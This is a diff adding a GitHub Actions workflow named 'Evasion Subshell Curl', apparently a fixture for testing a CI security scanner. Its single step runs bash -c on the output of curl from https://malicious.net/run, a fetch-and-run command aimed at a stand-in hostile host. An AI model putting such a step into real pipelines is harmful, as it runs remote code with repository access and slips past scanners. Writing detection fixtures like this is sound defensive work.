@@ -1,0 +1,14 @@
+name: Evasion Subshell Curl
+on: [push]
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+        with:
+          persist-credentials: false
+      - name: Shell invocation with command substitution
+        run: |
+          bash -c "$(curl -sSL https://malicious.net/run)"
